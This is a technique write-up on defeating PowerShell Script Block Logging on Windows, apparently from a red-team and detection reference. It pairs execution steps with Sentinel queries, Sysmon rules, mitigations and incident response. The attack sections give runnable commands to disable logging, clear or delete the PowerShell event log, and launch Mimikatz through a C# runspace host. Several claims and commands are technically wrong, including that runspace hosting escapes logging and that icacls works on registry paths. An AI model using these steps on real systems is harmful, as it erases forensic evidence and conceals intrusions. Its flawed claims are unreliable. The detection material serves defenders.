# [EVADE-IMPAIR-003]: PowerShell Script Block Logging Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-003 |
| **MITRE ATT&CK v18.1** | [T1562.002 - Disable Windows Event Logging](https://attack.mitre.org/techniques/T1562/002/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows Endpoint |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE (registry/HKLM methods partially patched with Protected Event Logging) |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows 10 (all), Windows 11 (all); Server 2016-2025; PowerShell 5.0+ |
| **Patched In** | Protected Event Logging (PEL) encrypts logs (Windows 11 21H2+, Server 2022+); Tamper Protection prevents registry disabling |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** PowerShell Script Block Logging (SBL) is a Windows feature that logs the full content of PowerShell script blocks to Event ID 4104 in the Microsoft-Windows-PowerShell/Operational log. Script Block Logging Bypass techniques disable or circumvent this logging to execute malicious scripts without forensic evidence. Methods include disabling SBL via Group Policy/registry, clearing the PowerShell Operational event log, or using techniques like UnmanagedPowerShell to execute code outside the PowerShell runtime entirely. This is a critical evasion technique because SBL is one of the last detection points after AMSI bypass.

**Attack Surface:** PowerShell event logging infrastructure, registry HKLM paths for SBL configuration, Windows Event Log service, and PowerShell session initialization.

**Business Impact:** **Undetectable Malicious Script Execution.** Once AMSI and Script Block Logging are bypassed, attackers can execute credential dumping, lateral movement, data exfiltration, and ransomware deployment with zero forensic evidence in logs. Security teams lose the ability to reconstruct the attack timeline.

**Technical Context:** Script Block Logging generates EventID 4104 every time a PowerShell script block is executed. Modern detection engines (Splunk, Sentinel, MDE) use SBL as a primary detection source. Bypassing SBL eliminates this visibility, making post-compromise investigation extremely difficult.

### Operational Risk

- **Execution Risk:** Medium (Requires admin to disable SBL; non-admin cannot disable but can clear logs if SYSTEM access exists).
- **Stealth:** High (No obvious security alerts; leaves minimal forensic trail).
- **Reversibility:** Partial (Re-enabling SBL doesn't recover cleared logs; logs are lost).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 18.8.4.1, 18.8.4.2 | Ensure PowerShell logging is enabled and monitored. |
| **DISA STIG** | WN11-CC-000150 | Require PowerShell Script Block Logging. |
| **CISA SCuBA** | SC.L1.2 | Enforce script logging and behavioral monitoring. |
| **NIST 800-53** | SI-4 (Information System Monitoring), SI-12 (Information Handling) | Detect and respond to security events; protect audit records. |
| **GDPR** | Art. 32, 33 | Security of processing; breach notification. |
| **DORA** | Art. 18, 19 | Incident reporting; detection and response. |
| **NIS2** | Art. 21, 22 | Detection capabilities; Incident response procedures. |
| **ISO 27001** | A.12.4.1 | Event logging and monitoring. |
| **ISO 27005** | Risk Scenario | Loss of audit evidence; undetected compromise. |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Local Administrator (to disable SBL via HKLM registry); standard user can disable via CurrentUser hive on some systems.
- **Required Access:** PowerShell execution capability.

**Supported Versions:**

- **Windows:** 10 (all), 11 (all), Server 2016, Server 2019, Server 2022, Server 2025
- **PowerShell:** 5.0+ (earlier versions lack SBL)
- **Event Logging:** EventID 4104 (Microsoft-Windows-PowerShell/Operational log)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### PowerShell Reconnaissance

```powershell
# Check if Script Block Logging is enabled
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" | Select-Object EnableScriptBlockLogging

# Check if Protected Event Logging is enabled
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" | Select-Object EnableTranscripting

# Check PowerShell Operational log size and event count
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 5 | Select-Object EventID, Message

# Check if Event Log service is running
Get-Service EventLog | Select-Object Status, StartType

# Check PowerShell execution policy
Get-ExecutionPolicy -Scope LocalMachine
```

**What to Look For:**

- **EnableScriptBlockLogging:** Value `1` = enabled; `0` or missing = disabled or not configured.
- **EnableTranscripting:** Value `1` = Protected Event Logging enabled; `0` = disabled.
- **EventLog Service:** Status `Running` = logging is active.
- **Operational Log:** If no events appear, logging may be disabled or log is full/cleared.

**Version Note:** Protected Event Logging is available on Windows 11 21H2+ and Server 2022+.

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Disable Script Block Logging via HKLM Registry

**Supported Versions:** Windows 10/11, Server 2016-2025

#### Step 1: Disable Script Block Logging Registry

**Objective:** Disable SBL by modifying the HKLM registry key so that PowerShell no longer logs script blocks.

**Command (PowerShell - Admin Required):**

```powershell
# Disable Script Block Logging
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
  -Name "EnableScriptBlockLogging" -Value 0

# Verify it's disabled
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" | Select-Object EnableScriptBlockLogging
```

**Expected Output:**

```
EnableScriptBlockLogging : 0
```

**What This Means:**

- PowerShell Script Block Logging is now disabled globally on the system.
- New PowerShell sessions will not log script blocks to EventID 4104.
- Already-running PowerShell sessions may still log until restarted.

**OpSec & Evasion:**

- Registry modification generates EventID 4657 (Registry value modified); this is highly suspicious.
- Disabling logging **after** a compromise means previous commands are still logged.
- Modern EDR (Defender for Endpoint, CrowdStrike) detects this registry change.

**Troubleshooting:**

- **Error:** "Access denied"
  - **Cause:** Not running as Administrator.
  - **Fix:** Run PowerShell as Administrator (right-click → "Run as administrator").

**References:**

- [Microsoft: Enable PowerShell Script Block Logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)

---

#### Step 2: Restart PowerShell Session (Force Policy Reload)

**Objective:** Restart PowerShell to apply the disabled logging policy to new sessions.

**Command:**

```powershell
# Close current session
exit

# Restart PowerShell (will inherit disabled SBL policy)
powershell.exe
```

**Expected Output:**

```
(PowerShell restarts without Script Block Logging)
```

**What This Means:**

- New PowerShell processes will not log script blocks.

---

### METHOD 2: Clear PowerShell Operational Event Log

**Supported Versions:** Windows 10/11, Server 2016-2025

#### Step 1: Clear PowerShell Event Log

**Objective:** Delete existing PowerShell script block logs to remove forensic evidence.

**Command (PowerShell - Admin Required):**

```powershell
# Clear the PowerShell Operational log
Clear-EventLog -LogName "Microsoft-Windows-PowerShell/Operational" -Confirm:$false

# Verify log is cleared
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -ErrorAction SilentlyContinue | Measure-Object
```

**Expected Output (After clearing):**

```
Count : 0
```

**What This Means:**

- All PowerShell script block logs (EventID 4104) are deleted.
- Forensic evidence of previous PowerShell execution is erased.

**OpSec & Evasion:**

- Clearing the log generates EventID 1102 (Audit log was cleared) in the Security log.
- This is extremely suspicious and likely to trigger alerts.

**Troubleshooting:**

- **Error:** "Access denied"
  - **Cause:** Not running as Administrator.
  - **Fix:** Run as Admin.

**References:**

- [Microsoft: Clear-EventLog](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/clear-eventlog)

---

#### Step 2: Alternative - Direct File Deletion

**Objective:** Delete the PowerShell event log file directly (more aggressive; requires SYSTEM).

**Command (Command Prompt - SYSTEM Required):**

```cmd
# Stop Event Log service
net stop EventLog

# Delete PowerShell Operational log file
del "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx"

# Restart Event Log service
net start EventLog
```

**Expected Output:**

```
The service has been stopped successfully.
The service has been started successfully.
```

**What This Means:**

- The physical event log file is deleted; logs cannot be recovered without forensic recovery.

**OpSec & Evasion:**

- Highly detectable: Service restart generates events; file deletion is logged.

---

### METHOD 3: Use UnmanagedPowerShell / C# to Execute Code

**Supported Versions:** Windows 10/11, Server 2016-2025

#### Step 1: Compile C# Assembly for Unmanaged Execution

**Objective:** Execute PowerShell code via a C# assembly that bypasses PowerShell logging entirely.

**Command (C# Code):**

```csharp
using System;
using System.Management.Automation;

class Program {
    static void Main() {
        // Create a PowerShell instance that bypasses logging
        var ps = PowerShell.Create(RunspaceMode.NewRunspace);
        
        // Add command (e.g., Mimikatz)
        ps.AddCommand("Invoke-Mimikatz").AddParameter("Command", "privilege::debug");
        
        // Execute without triggering SBL
        var result = ps.Invoke();
        
        // Print results
        foreach (var obj in result) {
            Console.WriteLine(obj);
        }
    }
}
```

**Compilation:**

```powershell
# Compile C# to executable
csc.exe /out:UnmanagedPS.exe UnmanagedPS.cs /reference:"C:\Program Files\PowerShell\7\System.Management.Automation.dll"

# Execute
.\UnmanagedPS.exe
```

**Expected Output:**

```
(Depends on underlying command; if Mimikatz, outputs credential data)
```

**What This Means:**

- Code executes via PowerShell API but **outside** the normal PowerShell process context.
- Script blocks are not logged to EventID 4104.

**OpSec & Evasion:**

- Harder to detect; no obvious PowerShell command lines.
- Process creation (csc.exe, executable) may still be logged.

**Troubleshooting:**

- **Error:** "Assembly not found"
  - **Cause:** PowerShell System.Management.Automation DLL not in expected location.
  - **Fix:** Adjust path to PowerShell installation (typically `C:\Program Files\PowerShell\7\` or `C:\Windows\System32\WindowsPowerShell\v1.0\`).

**References:**

- [PowerShell: Host APIs](https://learn.microsoft.com/en-us/powershell/scripting/developer/hosting/writing-a-windows-powershell-host-application)

---

### METHOD 4: Downgrade to PowerShell ISE (Limited Logging)

**Supported Versions:** Windows 10, Server 2016-2019 (PowerShell ISE still present)

#### Step 1: Execute Script via PowerShell ISE

**Objective:** PowerShell ISE (Integrated Scripting Environment) has different logging behavior; some versions have reduced logging.

**Command:**

```powershell
# Launch PowerShell ISE
powershell_ise.exe

# In ISE, paste malicious script and execute
# ISE execution may not trigger Script Block Logging in older versions
```

**Expected Output:**

```
(Script executes; ISE displays output but may not log to Event Log)
```

**What This Means:**

- PowerShell ISE execution may bypass or partially bypass SBL depending on version.

**OpSec & Evasion:**

- **Highly version-dependent:** Modern Windows versions log ISE execution to EventID 4104 identically.
- This technique is largely **obsolete** on current Windows versions.

**Troubleshooting:**

- **Error:** "ISE not available"
  - **Cause:** Windows 11 or Server 2022+ removed PowerShell ISE by default.
  - **Fix:** Not fixable; feature removed.

---

## 5. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team Tests

**Test ID:** T1562.002 (Event Log Clearing variants)

**Supported Tests:**

1. **Test: Clear PowerShell Event Log**
   - **Command:**
     ```powershell
     Invoke-AtomicTest T1562.002 -TestNumbers 1
     ```
   - **Cleanup:**
     ```powershell
     Invoke-AtomicTest T1562.002 -TestNumbers 1 -Cleanup
     ```

2. **Test: Disable Script Block Logging via Registry**
   - **Command:**
     ```powershell
     Invoke-AtomicTest T1562.002 -TestNumbers 2
     ```

**Reference:** [Atomic Red Team Library - T1562.002](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.md)

---

## 6. TOOLS & COMMANDS REFERENCE

### Built-In Windows Tools

#### Clear-EventLog (PowerShell)

**Version:** PowerShell 5.0+
**Usage:**
```powershell
Clear-EventLog -LogName "Microsoft-Windows-PowerShell/Operational"
```

**References:**

- [Microsoft Docs: Clear-EventLog](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/clear-eventlog)

---

#### wevtutil (Event Log Manager)

**Version:** All Windows versions
**Usage:**
```cmd
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

**References:**

- [Microsoft Docs: wevtutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil)

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: PowerShell Script Block Logging Disabled

**Rule Configuration:**

- **Required Table:** DeviceRegistryEvents
- **Required Fields:** RegistryKeyPath, RegistryValueName, RegistryValueData
- **Alert Severity:** Critical
- **Frequency:** Real-time (every 1 minute)
- **Applies To:** Windows 10/11, Server 2016+

**KQL Query:**

```kusto
// Detect disabling of PowerShell Script Block Logging
DeviceRegistryEvents
| where RegistryKeyPath contains "HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging"
| where RegistryValueName == "EnableScriptBlockLogging"
| where RegistryValueData == "0"
| project TimeGenerated, DeviceName, RegistryKeyPath, RegistryValueData, AccountName
```

**What This Detects:**

- Registry modification setting EnableScriptBlockLogging to 0 (disabled).

**Manual Configuration (Azure Portal):**

1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. Name: `PowerShell Script Block Logging Disabled`
3. Severity: `Critical`
4. Paste KQL query above
5. Run every: `1 minute`
6. Click **Review + create**

---

#### Query 2: PowerShell Event Log Cleared

**Rule Configuration:**

- **Required Table:** SecurityEvent
- **Required Fields:** EventID, ProcessName
- **Alert Severity:** Critical

**KQL Query:**

```kusto
// Detect clearing of PowerShell event logs
SecurityEvent
| where EventID == 1102  // Audit log cleared
| where Channel == "Microsoft-Windows-PowerShell/Operational"
  OR SubjectUserName contains "powershell"
| project TimeGenerated, Computer, EventID, SubjectUserName, Channel
```

**What This Detects:**

- EventID 1102 (Audit log cleared) for PowerShell logs.

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4657 (Registry Value Modified)**

- **Log Source:** Security
- **Trigger:** EnableScriptBlockLogging registry value is modified.
- **Filter:** ObjectName contains "ScriptBlockLogging"; EventType = SetValue
- **Applies To Versions:** All Windows versions

**Manual Configuration (Audit Registry):**

1. Open **secpol.msc** (Local Security Policy)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access** → **Audit Registry**
3. Enable: **Success and Failure**
4. Configure registry SACL (Security ACL) on sensitive keys:
   ```powershell
   icacls "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" /grant:r "Everyone:(OA;CI;READ_CONTROL;;;S-1-1-0)"
   ```

---

**Event ID: 1102 (Audit Log Cleared)**

- **Log Source:** Security
- **Trigger:** Any event log is cleared (including PowerShell Operational).
- **Filter:** EventID = 1102

**Manual Configuration (Group Policy):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Security System Extension** (Success and Failure)
4. Run `gpupdate /force`

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 11.0+

```xml
<Rule name="Script Block Logging Disabled" groupRelation="or">
  <RegistryEvent onmatch="all">
    <TargetObject condition="contains">ScriptBlockLogging</TargetObject>
    <Details condition="contains">0</Details>
    <EventType>SetValue</EventType>
  </RegistryEvent>
</Rule>

<Rule name="Event Log Service Stopped" groupRelation="or">
  <ProcessCreate onmatch="all">
    <Image condition="endswith">sc.exe</Image>
    <CommandLine condition="contains all">stop; EventLog</CommandLine>
  </ProcessCreate>
</Rule>

<Rule name="PowerShell Log File Deleted" groupRelation="or">
  <FileDelete onmatch="all">
    <TargetFilename condition="endswith">Microsoft-Windows-PowerShell%4Operational.evtx</TargetFilename>
  </FileDelete>
</Rule>
```

**Manual Configuration:**

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml`
3. Install:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious Security Event Log Operations"

- **Severity:** High
- **Description:** MDE detects attempts to clear event logs or disable logging via registry/service manipulation.
- **Applies To:** Devices with Defender for Endpoint
- **Remediation:** Immediate investigation; check for prior malicious activity before log clearing.

**Manual Configuration (Enable MDE Alerts):**

1. **Azure Portal** → **Microsoft Defender for Cloud** → **Defender plans**
2. Enable **Defender for Servers**
3. Deploy MDE agent
4. Monitor **Security Alerts** for "Event Log" related incidents

---

## 11. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

**1. Enable Protected Event Logging (PEL)**

- **Objective:** Encrypt PowerShell logs so clearing/tampering is detectable and logs survive system restart.
- **Applies To Versions:** Windows 11 (21H2+), Server 2022+

**Manual Steps (Group Policy):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Administrative Templates** → **PowerShell Core**
3. Find: **"Turn on PowerShell Protected Event Logging"**
4. Set to: **Enabled**
5. Provide certificate for encryption (or auto-generate):
   ```powershell
   # Generate self-signed certificate
   $cert = New-SelfSignedCertificate -DnsName $env:COMPUTERNAME -CertStoreLocation Cert:\LocalMachine\My
   ```
6. Run `gpupdate /force`

**Manual Steps (Registry):**

```powershell
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Force
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" `
  -Name "EnableInvocationLogging" -Value 1
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" `
  -Name "EnableTranscripting" -Value 1
```

**Validation:**

```powershell
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription"
```

**Expected Output:**

```
EnableTranscripting : 1
EnableInvocationLogging : 1
```

---

**2. Implement Remote Log Forwarding**

- **Objective:** Forward event logs to remote SIEM so local clearing doesn't eliminate evidence.
- **Applies To Versions:** All Windows versions

**Manual Steps (Group Policy - Event Forwarding):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Event Forwarding**
3. Find: **"Configure the Subscription Manager"**
4. Set to: **Enabled**
5. Specify SIEM server address:
   ```
   Server=https://your-siem-server:5985/wsman/SubscriptionManager/WEC,Refresh=60
   ```
6. Run `gpupdate /force`

**Manual Steps (PowerShell - Create Subscription):**

```powershell
# On SIEM server (collector)
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager" -Force
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager" `
  -Name "1" -Value "Server=https://localhost:5985/wsman/SubscriptionManager/WEC,Refresh=60"
```

---

**3. Implement Constrained Language Mode + Script Block Logging**

- **Objective:** Restrict PowerShell to constrained mode to prevent script disabling; enforce logging.
- **Applies To Versions:** Windows 10/11, Server 2016+

**Manual Steps (Group Policy):**

1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Administrative Templates** → **PowerShell Core** → **Script Execution**
3. Find: **"Turn on PowerShell Script Block Logging"**
4. Set to: **Enabled**
5. Find: **"Set the default source for Update-Help"**
6. Enable both logging policies
7. Run `gpupdate /force`

---

#### Priority 2: HIGH

**4. Restrict Registry Permissions (HKLM - PowerShell Keys)**

- **Objective:** Prevent non-admin users from modifying ScriptBlockLogging registry settings.

**Manual Steps (NTFS Permissions):**

```powershell
# Restrict HKLM\Software\Policies\Microsoft\Windows\PowerShell to Admins only
$path = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell"
icacls $path /grant:r "BUILTIN\Administrators:F" /inheritance:r
icacls $path /grant:r "SYSTEM:F" /inheritance:r
icacls $path /grant:r "BUILTIN\Users:R" /inheritance:r
```

---

**5. Enable Audit of Registry Modifications**

- **Objective:** Log all attempts to modify PowerShell event logging settings.

**Manual Steps (Local Security Policy):**

1. Open **secpol.msc**
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access** → **Audit Registry**
3. Enable: **Success and Failure**
4. Run:
   ```powershell
   auditpol /set /subcategory:"Registry" /success:enable /failure:enable
   ```

---

#### Validation Command

```powershell
# Check Script Block Logging is enabled
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"

# Check Protected Event Logging is enabled
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription"

# Verify PowerShell Operational log is configured for remote forwarding
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 1
```

**Expected Output (If Secure):**

```
EnableScriptBlockLogging : 1
EnableTranscripting : 1
(Recent events visible)
```

---

## 12. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Registry:** 
  - `HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging` (value 0)
  - `HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription` (missing or value 0)
- **Event Log:** Absence of PowerShell events (EventID 4104) where scripts were executed
- **Files:** Cleared event log files; no .evtx files in `C:\Windows\System32\winevt\Logs\`
- **Process:** PowerShell.exe with `Clear-EventLog`, `wevtutil`, `sc.exe` commands

#### Forensic Artifacts

- **Disk:** 
  - Event log files: `C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx`
  - Registry hive: `C:\Windows\System32\config\SOFTWARE` (contains policy settings)
  - USN Journal: Records of file deletions
- **Memory:** PowerShell command history in memory
- **Cloud:** Azure Sentinel logs; Defender for Endpoint alerts

#### Response Procedures

1. **Isolate:**
   ```powershell
   Disable-NetAdapter -Name "Ethernet" -Confirm:$false
   ```

2. **Collect Evidence:**
   ```powershell
   # Check for backup of PowerShell logs (Volume Shadow Copy)
   vssadmin list shadows /For=C:\
   
   # Attempt to recover deleted event log
   # Use forensic tools (Registry Explorer, FTK, EnCase)
   ```

3. **Remediate:**
   ```powershell
   # Re-enable Script Block Logging
   Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
     -Name "EnableScriptBlockLogging" -Value 1
   
   # Restart PowerShell
   exit
   powershell.exe
   ```

4. **Investigate:**
   - Check System event log (EventID 7034/7035) for service restart events
   - Review process creation (EventID 4688) for Clear-EventLog, wevtutil, sc.exe
   - Cross-reference with firewall logs for lateral movement around time of log clearing
   - Examine other event logs (Security, System, Sysmon) for artifacts of malicious activity before clearing

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-005] Internal Spearphishing | Attacker gains user access. |
| **2** | **Defense Evasion** | **[EVADE-IMPAIR-003]** | **Attacker disables PowerShell logging.** |
| **3** | **Credential Access** | [CA-DUMP-001] Mimikatz via Obfuscated PS | Attacker dumps creds without SBL evidence. |
| **4** | **Impact** | [DATA-EXF-001] Data Exfiltration | Attacker exfiltrates with full deniability. |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: Cobalt Strike Campaigns (2020-2023)

- **Target:** Financial Services, Government
- **Timeline:** 2020-2023
- **Technique Status:** Cobalt Strike team servers include functionality to disable Script Block Logging before executing beacon payloads.
- **Impact:** Stealthy post-exploitation; credential dumping, lateral movement unlogged.
- **Reference:** [Mandiant: Cobalt Strike Operations](https://www.mandiant.com/)

---

#### Example 2: FIN7 (2022-2024)

- **Target:** Retail, Hospitality
- **Timeline:** 2022-2024
- **Technique Status:** FIN7 used PowerShell scripts to clear event logs and disable logging before deploying point-of-sale malware.
- **Impact:** Eliminated forensic evidence; malware persisted for months undetected.
- **Reference:** [CISA: FIN7 Alert](https://www.cisa.gov/)

---

#### Example 3: Lazarus Group (2024)

- **Target:** Financial Institutions
- **Timeline:** 2024
- **Technique Status:** Lazarus used registry manipulation to disable Script Block Logging before executing custom malware.
- **Impact:** Undetected lateral movement; data exfiltration.
- **Reference:** [Securelist: Lazarus Campaigns](https://securelist.com/)

---